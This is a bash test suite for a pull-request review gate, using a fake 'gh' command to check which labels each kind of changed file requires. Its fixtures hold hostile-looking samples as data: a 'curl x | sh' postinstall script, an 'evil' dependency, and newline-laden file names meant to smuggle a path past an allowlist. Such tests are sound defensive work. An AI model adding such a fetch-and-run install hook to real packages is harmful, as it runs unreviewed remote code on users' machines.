#!/usr/bin/env bash
# Tests review-gate.sh with a fake `gh` on PATH. Run: .github/review-gate.test.sh
set -u
here="$(cd "$(dirname "$0")" && pwd)"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
mkdir "$work/bin"
cat >"$work/bin/gh" <<'FAKE'
#!/usr/bin/env bash
# A fake `gh api` that serves raw replies by endpoint from $FAKE_DIR, as GitHub does:
#   pr                the pull request object            (endpoint repos/*/pulls/N)
#   files.1 files.2   one file per page of a paginated list (repos/*/pulls/N/files)
#   labels.N, events.N  likewise
#   pkg.base, pkg.head  raw package.json at the base and head commits
# With --paginate --slurp it wraps the pages in one array; with --paginate and --jq it runs the filter
# once per page (so the combination a real gh rejects with --slurp is rejected here too).
# FAKE_FAIL=<name> makes that call fail with no output; FAKE_FAIL_AFTER=<name> prints its reply and
# then fails, as `gh api` does with an error body. Names: pr files labels events pkg.base pkg.head.
paginate=0 slurp=0 jqf="" name="" args=("$@")
for ((i = 0; i < ${#args[@]}; i++)); do
  a="${args[i]}"
  case "$a" in
    --paginate) paginate=1 ;;
    --slurp) slurp=1 ;;
    --jq) jqf="${args[i + 1]}" ;;
    repos/*/pulls/*/files) name=files ;;
    repos/*/issues/*/labels) name=labels ;;
    repos/*/issues/*/events) name=events ;;
    repos/*/contents/package.json\?ref=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb) name=pkg.base ;;
    repos/*/contents/package.json\?ref=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa) name=pkg.head ;;
    repos/*/pulls/*) name=pr ;;
  esac
done
[ "$slurp" = 1 ] && [ -n "$jqf" ] && { echo "the --slurp option is not supported with --jq" >&2; exit 1; }
[ "$slurp" = 1 ] && [ "$paginate" = 0 ] && { echo "--slurp needs --paginate" >&2; exit 1; }
[[ " ${FAKE_FAIL:-} " == *" $name "* ]] && exit 1
reply() {
  case "$name" in
    pr | pkg.base | pkg.head)
      [ -f "$FAKE_DIR/$name" ] || exit 1
      cat "$FAKE_DIR/$name"
      ;;
    *)
      [ -f "$FAKE_DIR/$name.1" ] || exit 1
      pages=("$FAKE_DIR/$name".*)
      if [ "$paginate" = 1 ] && [ "$slurp" = 1 ]; then
        jq -s . "${pages[@]}"
      elif [ "$paginate" = 1 ] && [ -n "$jqf" ]; then
        for p in "${pages[@]}"; do jq -r "$jqf" "$p"; done
      elif [ "$paginate" = 1 ]; then
        cat "${pages[@]}"
      else
        cat "${pages[0]}"
      fi
      ;;
  esac
}
reply
[[ " ${FAKE_FAIL_AFTER:-} " == *" $name "* ]] && exit 1
exit 0
FAKE
chmod +x "$work/bin/gh"
fail=0
pkg_with() { printf '{\n  "name": "beyondleetcode",\n  "version": "%s",\n  "scripts": {"a": "1"},\n  "dependencies": {"a": "1.0.0"}\n}\n' "$1"; }
pkg="$(pkg_with 1.0.0)"
bumped="$(pkg_with 1.0.1)"
with_dep='{
  "name": "beyondleetcode",
  "version": "1.0.1",
  "scripts": {"a": "1"},
  "dependencies": {"a": "1.0.0", "evil": "9.9.9"}
}'
with_script='{
  "name": "beyondleetcode",
  "version": "1.0.1",
  "scripts": {"a": "1", "postinstall": "curl x | sh"},
  "dependencies": {"a": "1.0.0"}
}'
# The same line count as the base and a changed version, but a second line changed too.
second_line='{
  "name": "beyondleetcode",
  "version": "1.0.1",
  "scripts": {"a": "1"},
  "dependencies": {"a": "1.0.0", "e": "9"}
}'
# jq keeps only the last duplicate key, so a jq comparison would miss the change in the first block.
dup_base='{
  "name": "beyondleetcode",
  "version": "1.0.0",
  "scripts": {"a": "1"},
  "scripts": {"a": "2"}
}'
dup_head='{
  "name": "beyondleetcode",
  "version": "1.0.1",
  "scripts": {"a": "curl x | sh"},
  "scripts": {"a": "2"}
}'
# Same keys, swapped order, and the version bumped: jq -S would call this equal.
reordered='{
  "version": "1.0.1",
  "name": "beyondleetcode",
  "scripts": {"a": "1"},
  "dependencies": {"a": "1.0.0"}
}'
nested_base='{
  "name": "beyondleetcode",
  "version": "1.0.0",
  "overrides": {
  "version": "1.0.0"
  }
}'
nested_head='{
  "name": "beyondleetcode",
  "version": "1.0.0",
  "overrides": {
  "version": "6.6.6"
  }
}'
notfound='{"message":"Not Found"}'
owner_event='{"event":"labeled","label":{"name":"human-verified"},"actor":{"login":"owner"}}'
other_event='{"event":"labeled","label":{"name":"human-verified"},"actor":{"login":"some-bot"}}'
null_event='{"event":"labeled","label":{"name":"human-verified"},"actor":null}'
noise_event='{"event":"labeled","label":{"name":"reviewed"},"actor":{"login":"some-bot"}}'

# Environment knobs, set before a check: HEAD_REPO (a full name, or "null"), PKG_BASE, PKG_HEAD,
# PKG_STATUS (package.json's status in the files API), CHANGED (the pull request's changed_files),
# PR_RAW (the whole pull request reply), EVENTS_1 and EVENTS_2 (raw event pages), FAKE_FAIL and
# FAKE_FAIL_AFTER (calls to fail), WANT (text the output must hold).
# check <want exit> <what> <branch> <labels, comma separated> <who applied human-verified> <file>...
# A file is `name` or `name<-previous name`.
check() {
  local want="$1" what="$2" ref="$3" labels="$4" who="$5" got n
  shift 5
  rm -rf "$work/d" && mkdir "$work/d"
  printf '%s\0' "$@" | jq -Rs --arg st "${PKG_STATUS-modified}" '
    split("\u0000")[:-1] | map(split("<-") | {filename: .[0], status: (if .[0] == "package.json" then $st else "modified" end)}
      + (if length > 1 then {previous_filename: .[1]} else {} end))' >"$work/d/files.1"
  n="$(jq length "$work/d/files.1")"
  if [ -n "${PR_RAW+x}" ]; then printf '%s' "$PR_RAW" >"$work/d/pr"; else
    jq -n --arg ref "$ref" --arg repo "${HEAD_REPO-owner/repo}" --argjson n "${CHANGED-$n}" '
      {head: {ref: $ref, sha: ("a" * 40), repo: (if $repo == "null" then null else {full_name: $repo} end)}, base: {sha: ("b" * 40)}, changed_files: $n}' >"$work/d/pr"
  fi
  if [ -n "$labels" ]; then printf '%s' "$labels" | jq -Rc 'split(",") | map({name: .})' >"$work/d/labels.1"; else echo '[]' >"$work/d/labels.1"; fi
  if [ -n "${EVENTS_1-}" ]; then
    printf '[%s]' "$EVENTS_1" >"$work/d/events.1"
    [ -n "${EVENTS_2-}" ] && printf '[%s]' "$EVENTS_2" >"$work/d/events.2"
  elif [ -n "$who" ]; then
    jq -n --arg who "$who" '[{event: "labeled", label: {name: "human-verified"}, actor: {login: $who}}]' >"$work/d/events.1"
  else echo '[]' >"$work/d/events.1"; fi
  printf '%s\n' "${PKG_BASE-$pkg}" >"$work/d/pkg.base"
  printf '%s\n' "${PKG_HEAD-$pkg}" >"$work/d/pkg.head"
  PATH="$work/bin:$PATH" FAKE_DIR="$work/d" GITHUB_REPOSITORY=owner/repo "$here/review-gate.sh" 7 >"$work/out" 2>&1
  got=$?
  if [ "$got" != "$want" ]; then
    echo "FAIL $what: exit $got, want $want"
    sed 's/^/     /' "$work/out"
    fail=1
  elif [ -n "${WANT-}" ] && ! grep -Fq -- "$WANT" "$work/out"; then
    echo "FAIL $what: the output lacks '$WANT'"
    sed 's/^/     /' "$work/out"
    fail=1
  else echo "ok   $what"; [ -n "${SHOW-}" ] && sed "s/^/       /" "$work/out"; fi
}

check 0 "docs only needs no label" C1-x "" "" docs/sprints.md README.md
check 0 "tests only needs no label" C1-x "" "" src/lib/server/markdown.test.ts src/routes/problems/problem.e2e.ts
check 1 "a source file needs reviewed" C1-x "" "" src/routes/users/+page.svelte
check 0 "a source file with reviewed passes" C1-x "reviewed" "" src/routes/users/+page.svelte src/routes/users/users.multi.e2e.ts
check 1 "a file the spec does not name is held to tier 2" C1-x "" "" package.json
check 1 "an agent definition is held to tier 2" C1-x "" "" .claude/agents/x.md
check 0 "an agent definition with reviewed passes" C1-x "reviewed" "" .claude/agents/x.md
check 1 "a skill's SKILL.md is held to tier 2" C1-x "" "" .claude/skills/x/SKILL.md
check 1 "a hook's test file is held to tier 2" C1-x "" "" .claude/hooks/lane-files.test.sh
check 1 "the Runner needs security-reviewed too" C1-x "reviewed" "" src/lib/server/runner/sandbox.ts
check 1 "the Runner with only security-reviewed still needs reviewed" C1-x "security-reviewed" "" src/lib/server/runner/sandbox.ts
check 0 "the Runner with both labels passes" C1-x "reviewed,security-reviewed" "" src/lib/server/runner/sandbox.ts
check 1 "a Runner test file is tier 3 by its path" C1-x "reviewed" "" src/lib/server/runner/engine.test.ts
check 1 "identity code is tier 3" C1-x "reviewed" "" src/lib/server/identity/gate.ts
check 1 "a Sandbox Dockerfile is tier 3" C1-x "reviewed" "" Dockerfile.sandbox-go
check 1 "a workflow is tier 3" dependabot/github_actions/x "" "" .github/workflows/ci.yml
check 0 "a workflow with both labels passes" dependabot/github_actions/x "reviewed,security-reviewed" "" .github/workflows/ci.yml
check 1 "content needs human-verified" C1-x "reviewed,security-reviewed" "" content/topics/stacks/topic.json
check 0 "content verified by the owner passes" C1-x "human-verified" "owner" content/topics/stacks/chapters/a/chapter.md
check 1 "content verified by another account fails" C1-x "human-verified" "some-bot" content/topics/stacks/topic.json
check 1 "content and source need both kinds of label" C1-x "human-verified" "owner" content/topics/stacks/topic.json src/lib/server/content/catalogue.ts
check 0 "content and source with both pass" C1-x "human-verified,reviewed" "owner" content/topics/stacks/topic.json src/lib/server/content/catalogue.ts
check 1 "a renamed file is judged by both names" C1-x "" "" "docs/notes.md<-src/lib/old.ts"

# The release exemption.
rp=release-please--branches--main--components--beyondleetcode
PKG_HEAD=$bumped check 0 "a release-please pull request passes as tier 1" "$rp" "autorelease: pending" "" CHANGELOG.md package.json .release-please-manifest.json
check 0 "a release branch that changes only the changelog passes" "$rp" "" "" CHANGELOG.md
PKG_HEAD=$with_dep check 1 "a release branch that adds a dependency is judged by its files" "$rp" "" "" CHANGELOG.md package.json
PKG_HEAD=$with_script check 1 "a release branch that adds a script is judged by its files" "$rp" "" "" package.json
PKG_HEAD=$with_dep check 0 "a release branch that adds a dependency passes once reviewed" "$rp" "reviewed" "" CHANGELOG.md package.json
HEAD_REPO=someone/fork PKG_HEAD=$bumped check 1 "a release-named branch from a fork is judged by its files" "$rp" "" "" CHANGELOG.md package.json
HEAD_REPO=null PKG_HEAD=$bumped check 1 "a release-named branch with no head repository is judged by its files" "$rp" "" "" CHANGELOG.md package.json
PKG_HEAD='' check 1 "a package.json the gate cannot read is judged by its files" "$rp" "" "" package.json
check 1 "a release branch that changes source is judged by its files" "$rp" "" "" CHANGELOG.md src/lib/server/app.ts
check 1 "package.json outside a release branch needs reviewed" C1-x "" "" package.json CHANGELOG.md
PKG_BASE=$dup_base PKG_HEAD=$dup_head check 1 "a duplicate scripts key cannot hide a change" "$rp" "" "" package.json
PKG_HEAD=$reordered check 1 "a reordered package.json is judged by its files" "$rp" "" "" package.json
PKG_HEAD=$second_line check 1 "a second changed line is judged by its files" "$rp" "" "" package.json
PKG_BASE=$nested_base PKG_HEAD=$nested_head check 1 "a changed nested version line is judged by its files" "$rp" "" "" package.json
PKG_STATUS=added PKG_HEAD=$bumped check 1 "package.json added rather than modified is judged by its files" "$rp" "" "" package.json
PKG_STATUS=renamed PKG_HEAD=$bumped check 1 "package.json renamed is judged by its files" "$rp" "" "" package.json
FAKE_FAIL=pkg.head PKG_HEAD=$bumped check 1 "a failed head package.json fetch is judged by its files" "$rp" "" "" package.json
FAKE_FAIL=pkg.base PKG_HEAD=$bumped check 1 "a failed base package.json fetch is judged by its files" "$rp" "" "" package.json
PKG_BASE=$notfound PKG_HEAD=$notfound FAKE_FAIL_AFTER="pkg.base pkg.head" check 1 "two identical error bodies are not an unchanged package.json" "$rp" "" "" package.json
PKG_BASE=$notfound PKG_HEAD=$notfound check 1 "two identical replies that are not package.json are judged by its files" "$rp" "" "" package.json

# A failed GitHub call fails the gate, whichever call it is and whether or not it printed first.
for call in pr files labels; do
  FAKE_FAIL=$call check 1 "the $call call failing fails the gate" C1-x "reviewed" "" docs/a.md
  FAKE_FAIL_AFTER=$call check 1 "the $call call printing and then failing fails the gate" C1-x "reviewed" "" docs/a.md
done
FAKE_FAIL=events check 1 "the events call failing fails the gate" C1-x "human-verified" "owner" content/a.md
FAKE_FAIL_AFTER=events check 1 "the events call printing the owner and then failing fails the gate" C1-x "human-verified" "owner" content/a.md

# Branch data that is empty or malformed.
PR_RAW='' check 1 "an empty pull request reply fails the gate" C1-x "" "" docs/a.md
PR_RAW='{}' check 1 "a pull request with no branch data fails the gate" C1-x "" "" docs/a.md
PR_RAW='not json' check 1 "a pull request reply that is not JSON fails the gate" C1-x "" "" docs/a.md
PR_RAW="$notfound" check 1 "an error body for the pull request fails the gate" C1-x "" "" docs/a.md
PR_RAW='{"head":{"ref":"x","sha":"nope","repo":{"full_name":"owner/repo"}},"base":{"sha":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},"changed_files":1}' check 1 "a head sha that is not a sha fails the gate" C1-x "" "" docs/a.md
PR_RAW='{"head":{"ref":"x","sha":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","repo":{"full_name":"owner/repo"}},"base":{"sha":""},"changed_files":1}' check 1 "an empty base sha fails the gate" C1-x "" "" docs/a.md
PR_RAW='{"head":{"ref":"","sha":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","repo":{"full_name":"owner/repo"}},"base":{"sha":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},"changed_files":1}' check 1 "an empty head ref fails the gate" C1-x "" "" docs/a.md
PR_RAW='{"head":{"ref":"x","sha":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","repo":{"full_name":"owner/repo"}},"base":{"sha":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"}}' check 1 "a pull request with no changed_files fails the gate" C1-x "" "" docs/a.md

# An incomplete file list.
CHANGED=5 WANT="too large" check 1 "a file list shorter than changed_files fails the gate" C1-x "" "" docs/a.md
CHANGED=1 check 0 "a file list that matches changed_files passes" C1-x "" "" docs/a.md
mapfile -t many < <(seq -f 'docs/f%g.md' 1 3000)
CHANGED=3000 WANT="too large" check 1 "3000 files fail the gate: the files API stops there" C1-x "" "" "${many[@]}"
mapfile -t fewer < <(seq -f 'docs/f%g.md' 1 2999)
CHANGED=2999 check 0 "2999 files are judged" C1-x "" "" "${fewer[@]}"

# A file name with a control character is never classified.
WANT="control character" check 1 "a name ending .md plus a newline fails the gate" C1-x "" "" $'src/a.ts\n.md'
WANT="control character" check 1 "a name with a trailing newline fails the gate" C1-x "" "" $'docs/a.md\n'
WANT="control character" check 1 "a name with a tab fails the gate" C1-x "" "" $'docs/a\tb.md'
WANT="control character" check 1 "a name with a carriage return fails the gate" C1-x "" "" $'docs/a\rb.md'
WANT="control character" check 1 "a previous name with a newline fails the gate" C1-x "" "" $'docs/a.md<-src/x\ny.ts'
PKG_HEAD=$bumped WANT="control character" check 1 "a newline cannot smuggle a name past the release allowlist" "$rp" "" "" $'CHANGELOG.md\nsrc/x.ts' package.json

# human-verified: the last labeling over the whole history, by the owner.
EVENTS_1=$owner_event EVENTS_2=$null_event check 1 "owner on page 1, a null actor last on page 2, fails" C1-x "human-verified" "" content/a.md
EVENTS_1=$owner_event EVENTS_2=$other_event check 1 "owner, then another account, fails" C1-x "human-verified" "" content/a.md
EVENTS_1=$other_event EVENTS_2=$owner_event check 0 "another account, then the owner, passes" C1-x "human-verified" "" content/a.md
EVENTS_1=$owner_event EVENTS_2=$noise_event check 0 "an unrelated labeling on a later page does not count" C1-x "human-verified" "" content/a.md
EVENTS_1=$null_event EVENTS_2=$owner_event check 0 "a null actor followed by the owner passes" C1-x "human-verified" "" content/a.md
EVENTS_1=$noise_event check 1 "no human-verified labeling in the history fails" C1-x "human-verified" "" content/a.md
EVENTS_1='"not an event"' check 1 "a malformed events page fails" C1-x "human-verified" "" content/a.md

# A failed GitHub call with nothing served at all.
rm -rf "$work/d" && mkdir "$work/d"
PATH="$work/bin:$PATH" FAKE_DIR="$work/d" GITHUB_REPOSITORY=owner/repo "$here/review-gate.sh" 7 >/dev/null 2>&1
if [ $? = 1 ]; then echo "ok   a failed GitHub call fails the gate"; else echo "FAIL a failed GitHub call"; fail=1; fi
check 1 "an empty file list fails the gate" C1-x "" ""
exit "$fail"
